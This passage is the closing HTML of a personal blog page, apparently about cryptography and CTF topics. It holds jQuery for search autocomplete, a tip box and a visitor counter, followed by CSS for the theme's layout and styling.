        $('.search').AutoComplete({
            'data': ['#Write Up','#docker','#ECC','#Paillier','#Lattice','#Dsa','#LCG','#Rc4','#SM4','#Rsa','#python','#操作模式','#Abstract algebra','#private','#Nmap','#Linux','#book',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
